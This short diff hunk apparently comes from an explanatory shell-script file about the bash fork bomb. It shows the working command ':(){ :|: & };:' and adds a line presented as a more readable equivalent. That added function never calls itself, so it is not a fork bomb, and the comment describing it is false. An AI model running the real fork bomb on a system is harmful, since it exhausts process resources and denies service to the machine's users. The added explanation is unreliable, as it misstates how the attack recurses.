@@ -6,3 +6,6 @@
 # function definition and then calls the function to begin the chain reaction.
 # A very nasty trick, indeed.
 :(){ :|: & };:
+
+# A more-readable version of the fork bomb could be written as:
+FORK(){ true | true & }; FORK
